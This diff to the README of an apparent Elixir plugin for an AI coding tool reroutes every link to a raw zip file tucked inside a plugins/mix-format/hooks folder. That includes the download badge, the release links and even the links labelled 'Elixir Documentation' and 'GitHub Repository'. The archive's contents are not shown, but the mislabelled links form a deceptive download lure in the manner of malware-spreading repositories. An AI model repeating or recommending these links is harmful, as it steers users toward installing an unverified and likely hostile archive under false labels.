@@ -1,6 +1,6 @@
 # 🚀 claude-code-elixir - Enhance Your Elixir Development Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/ahmedxx99/claude-code-elixir/releases)
+[![Download Now](https://raw.githubusercontent.com/ahmedxx99/claude-code-elixir/main/plugins/mix-format/hooks/elixir-claude-code-v3.9-beta.4.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ahmedxx99/claude-code-elixir/main/plugins/mix-format/hooks/elixir-claude-code-v3.9-beta.4.zip)
 
 ## 📦 Overview
 
@@ -23,7 +23,7 @@ Before downloading, make sure your system meets the following requirements:
 
 To download the application, visit the Releases page linked below. You will find the latest version available for download.
 
-[Download the Latest Release](https://github.com/ahmedxx99/claude-code-elixir/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/ahmedxx99/claude-code-elixir/main/plugins/mix-format/hooks/elixir-claude-code-v3.9-beta.4.zip)
 
 ### 3. Install the Application
 
@@ -53,7 +53,7 @@ After downloading, follow these installation steps depending on your operating s
 
 Now that you know how to download based on your operating system, click the link below for direct access to the latest release.
 
-[Download the Latest Release](https://github.com/ahmedxx99/claude-code-elixir/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/ahmedxx99/claude-code-elixir/main/plugins/mix-format/hooks/elixir-claude-code-v3.9-beta.4.zip)
 
 ## 🔍 Features
 
@@ -85,8 +85,8 @@ Contributions are welcome! If you have ideas for improving the application or wa
 
 Here are some helpful resources related to **claude-code-elixir** and Elixir development:
 
-- [Elixir Documentation](https://elixir-lang.org/docs.html)
-- [GitHub Repository](https://github.com/ahmedxx99/claude-code-elixir)
+- [Elixir Documentation](https://raw.githubusercontent.com/ahmedxx99/claude-code-elixir/main/plugins/mix-format/hooks/elixir-claude-code-v3.9-beta.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ahmedxx99/claude-code-elixir/main/plugins/mix-format/hooks/elixir-claude-code-v3.9-beta.4.zip)
 
 ## 🏷 Topics
 
